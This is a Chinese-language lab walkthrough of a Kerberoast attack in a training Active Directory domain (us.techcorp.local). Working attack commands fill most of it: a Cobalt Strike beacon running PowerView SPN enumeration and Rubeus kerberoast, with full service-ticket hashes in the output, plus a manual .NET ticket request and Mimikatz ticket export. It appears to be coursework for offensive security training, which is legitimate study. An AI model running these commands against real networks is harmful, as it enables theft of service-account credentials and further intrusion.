Hands-On 6:
Task
•  Using the Kerberoast attack, get the clear-text password for an account in us.techcorp.local domain.

pv枚举spn

```
beacon> powershell-import tools/PowerView.ps1
[*] Tasked beacon to import: /root/cs4.7/tools/PowerView.ps1
[+] host called home, sent: 145588 bytes
beacon> powershell Get-NetUser -spn |select userprincipalname,serviceprincipalname
[*] Tasked beacon to run: Get-NetUser -spn |select userprincipalname,serviceprincipalname
[+] host called home, sent: 453 bytes
[+] received output:
#< CLIXML



userprincipalname serviceprincipalname            

----------------- --------------------            

                  kadmin/changepw                 
serviceaccount    USSvc/serviceaccount            
appsvc            appsvc/us-jump.us.techcorp.local

```

## 请求spn

这里使用Rubeus.exe请求一个spn，注意，用原来tools里面的Rubeus.exe 请求会报错，我用tools里的master包重新生成了一个Rubeus.exe可以用
```
beacon> execute-assembly tools/Rubeus-master/Rubeus/bin/Debug/Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[+] host called home, sent: 402057 bytes
[+] received output:


   ______        _                      

  (_____ \      | |                     

   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/



  v1.6.1 





[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User           : appsvc
[+] Ticket successfully imported!
[*] Searching path 'LDAP://US.TECHCORP.LOCAL/DC=US,DC=TECHCORP,DC=LOCAL' for Kerberoastable users
[*] Searching for accounts that only support RC4_HMAC, no AES



[*] Total kerberoastable users : 1



$krb5tgs$23$*appsvc$us.techcorp.local$appsvc/us-jump.us.techcorp.local*$CBE3A9A8B3E2839A6B4A5A9BA444E7AA$1FDB6AD1D70FB51677AE629A6FEDA97D338C60144BF284F2DA06751BB45E956C10613AD4449FDD08BC0CFFA2258E9E4DA121195CB652CC5DE9F7202A3039B3D94579D71A1346093F445E63306E19699DA93827C35A5FEB3E634E0F5B9AE55CFADA8B005A2D475B814EE61C5973CF0F4E4E7B288E2181922BEA951297C592AED3D703D9FF31B4C68C13AA3C0E634647DCF1F95906E3F54DF4CF84A1DBD97205103043DCCCC08C601ADC31672C8255653482FD09ED44373B34B355C8E318755D0AF638C16D02C3F52DC0F54CA064544DFC87AC713BDD67329EB2AE8C217759ECCB31996E5AF6201FE91986993082B8A9B414D31A42050BF337C1E42B2ABF282227047AE0E98727BF0F0B760DD922A7E37C7700288B08BFEE9CF334199AC1419E8FFF193BD1481E5EF5E79D9F7D9A714AB39BD36234B5ECC58300E97B44B8E2AB8C6346648DDD2BAF1514F3372BC77F0F382B84CC35521A05BDD944F54765FCE836336D72A77E2CFC67C7C9DA091DBF0A8594142138D135AEE11ED72FAD5B7B8F6B1C8F5521F32173080FFD009DBDF8C420FA5AD0F1C940D9D7615629FB308A20FB14907642F364B06E8464D5E8A98CCF43B4694B467D9F14C141E34F892C01A6D7EA17D75F825560F9AA3FCF8EE3710B08A8E000868967930A69ADFEDC008E994383A0F747C12D08096856F814E16CE8D4C3EA80ACBD75A1E451615157C6E0833FAF441086F25C323403610A02F99445EFB68E5DEB3B24700ED15850273562367D9B6580715587797073372099D78DC5D4863B382BBF70C37E12A89E16AB98AE505794F7F93CA3ABEEFF820F2DB431D666DB38CD5A39180890743EC28570BEEA46263F0FCD6414ABE324B816099C6F1191EE185AE34C8B1FE8C43AE946FE0A47C04BAA07487057892EF91EE8EE556A00BD888D9DC856B203FF88E360F267B7E73143152DEA771C70AD167B6ED9C21C8BFCF4A1BFA41CAB4A4ACF3CBA90205A3B3ADB89F08D961F575463DBC7AFBDB61B8CA64D51B480E25F718E05ECC40071BB75E07E019E29198C521195D466E9D111A2754CCA5DF22322E0549092D6954367BD2642447228E6792EB349C11EB057A8C6BCEF7DDE7737796A9AAA40FCFCFD5D5FB79E7771CCF8E408BC6E178DD6C55C097164C923E62D70A2FE4873BF6CC3BCDC08D1182B1846328CA9D78EB03C5E27509C52744DC8F2E72C87A24C90ED8BF23F884BF4E30C9E7C765E028F436F4F26730A797357081155D86FDD4B85833A8E27FA561400913FE0625215D863206E9E340288489B80B1692346BC7072F3D65D52ED9E5EA7A0394ED690602E880B58335407CF63A3462BFB6BBB9585108A78268779E8DE819939B11D51EF5313AFC6FC6A33C48C8BBD90C160E8B7E0263F810394E0F56835D1A018F29CF9DA6AD6899C917EEBCD971E212CF9332EF87A92369C3D4E512AD6BEA6EB188B61C279F83B3EF4A40A0B6CBADAFD402717EBE29E1ECDE16E7D9EA14451F3657B0437722B8592B9AF4D8DDCB7737F3C5AEEB090AF2263F748F98B24A8542226CA9778231F70C8EE0FBB1D485D756B21F7A26E84F6FC927CEA17FE6BCF880F5ED89BB5340C369501




```


这里的exe是[github](https://github.com/GhostPack/Rubeus)上的开发版
```
beacon> execute-assembly tools/Rubeus-master/Rubeus/bin2/Debug/Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[+] host called home, sent: 591497 bytes
[+] received output:


   ______        _                      

  (_____ \      | |                     

   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/



  v2.2.0 





[*] Action: Kerberoasting


[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : appsvc
[*] Target Domain          : us.techcorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=appsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1



$krb5tgs$23$*appsvc$US.TECHCORP.LOCAL$appsvc/us-jump.us.techcorp.local*$A88AA8179E7F17C0C17E4F992E150D75$D42FA5BA267E359E4A21B4FDCAEF19BC705B5E190B2C2AA6575E7E0C5B7E412702754127C83C2D7E951313A1916AB909E42F49DBA10107F4452A943CF463FA398A7858D8A79568377DB2909F157A8A7986DEC8B2F9775A4D044A37A38B79712D7E09A65511C07D18D156FCEB39B6F022AAA0B8A96AB216FD5A76646AD6D54B7554B14A1AAC8DD8C1BF8FEC2057AB56F13C7840866960EA996050514FDB93E906A75330BD1621F8358397742EB4F38FBD4AF165226F2FE8E71C655B376BB05C069F172B2DDC3B9C93810D9B512F4CCDC0343E9ADDA22EC73BC29490AD14E6CAB3F3CD0F2CD2059D91F1BAF70AF4E863C4E08F4CEBF4370A38374EE777C36494FBE9E718915737F286453C6D90489DCD966748E69027B01F2D187C79D16FE662CB9810EBA18B99246200769585FF83BA8EE846925C4D34134EA5AFB70A07731306EB570CAB6E5F584ACFA2162714A36D40BA1D5E3AC3F313A93765A64BFB9A7766994BB8CF9729D0B88BFC00AAF71DF0DD77A9BA905BBAF9CC09829644A568C903A535AC173B0C469A0AC5E540584F27FBCCE23466DCDEA6FED48F4F299944F95D238C2C60CC26AEDBEB37916D49972B06B79B590ED0590BE147BA9CE4E990210744848168024482B5F1021F879415B71C513724853B8E40EFF7F127934B8F5963C710212A0FE5BC196139993EDF29260E601C605FDB4A9A5B81A1A488985A612D3D173ADE21D66D214D81B65F3148471E768C063FBCAA7C369033FB875C4E3754730D0B27F29A3B9A4C29E7144A84367617C21E5DBD19F5197D8A0433B66226F0BFF337CCA930ECC4799F19D51963A81734AF843316D511DE25D64353F54CE831E2E6498011A24527AAC30CFF79C85074FED025D0D573DB8165E48CB0C9ED145B1E1E316714367618183E47F2BFB9B6AB820BCC1DF4C33C2A99A0CB46C48F4A591AAEF7E8E69C6414F14BE25FCF2A75C9C3B3DDD3556E97E0AC5C6FAABE33C3A3989D79434B74A7EE229AFD14EA61C37A3A635057401AE8F67695D171F42E5325F392E93F77958778E9E278414A23066F377B3DE14C9F7F514DBC30947EC359E31DC42A87B27B7AB3728242A6744B9DEF0F08BB238621DE373D928AA9D19EE43607B1EA732740F97E579328299426FCD976D0E2654A1B774D9B626274C46C04D7B4641D28B20921259D6EE6CC71A85C10168382639F71E42D1B5CBE47BE828BD7E87C8292726C575A2EA8970D1CE23A21B48CFB10317B8ABEE0EBB93F2254A7971F0CC04534C95D94DC9E19FE8C40A7FDBDD06D3385F31080B70DC80837ACAA24D00CA69DB129D3E498365827968580844904923CF6E4A612B76B73CCFECCB1ED88025FFCBAB7E401579D8651A5938A6E7C2135E11152689E0F4B8EA8A4FC73CF8144B3EE37F41082F5C761461E450E7BA444D0D3B6668A6171560EBDD586EAF664B7DB273F9F77EA6C6984C63EF77BA0EFB96F978848DCB0A1D3C8F4DF955F6610CE8E1C201E64C3ED70B5E07E54684B6673EDE6E352CF292893F0A6DAC24278AEC45C59DFC776FA354B8BDAEA423B2B73694E2DDD1D9C604171902A6DE59A6512F84CD204BCEB641769A89D8142A7CB


```

这里的哈希不知道为啥破解不出来。。


## 请求一张ticket

这里还是要到学生机执行，CS执行会报错
```
PS C:\Windows\system32> Add-Type -AssemblyName System.IdentityModel
PS C:\Windows\system32> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"


Id                   : uuid-0ede882b-e9df-46b5-919c-99dbe006902a-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/12/2022 2:34:37 PM
ValidTo              : 11/13/2022 12:34:37 AM
ServicePrincipalName : USSvc/serviceaccount
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\Windows\system32> klist

Current LogonId is 0:0x242f4b

Cached Tickets: (2)

#0>     Client: studentuser138 @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 11/12/2022 6:34:37 (local)
        End Time:   11/12/2022 16:34:37 (local)
        Renew Time: 11/19/2022 6:34:37 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: US-DC.us.techcorp.local

#1>     Client: studentuser138 @ US.TECHCORP.LOCAL
        Server: USSvc/serviceaccount @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 11/12/2022 6:34:37 (local)
        End Time:   11/12/2022 16:34:37 (local)
        Renew Time: 11/19/2022 6:34:37 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: US-DC.us.techcorp.local
```


这里如果用CS的mimikatz模块导出，命令生效但是找不到文件..
```
beacon> mimikatz kerberos::list /export
[*] Tasked beacon to run mimikatz's kerberos::list /export command
[+] host called home, sent: 788092 bytes
[+] received output:

[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 11/12/2022 6:34:37 AM ; 11/12/2022 4:34:37 PM ; 11/19/2022 6:34:37 AM
   Server Name       : krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
   Client Name       : studentuser138 @ US.TECHCORP.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
   * Saved to file     : 0-40e10000-studentuser138@krbtgt~US.TECHCORP.LOCAL-US.TECHCORP.LOCAL.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 11/12/2022 6:34:37 AM ; 11/12/2022 4:34:37 PM ; 11/19/2022 6:34:37 AM
   Server Name       : USSvc/serviceaccount @ US.TECHCORP.LOCAL
   Client Name       : studentuser138 @ US.TECHCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 1-40a10000-studentuser138@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
```

还是要在学生机操作。。
```
PS C:\AD\Tools> . C:\AD\Tools\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"'
```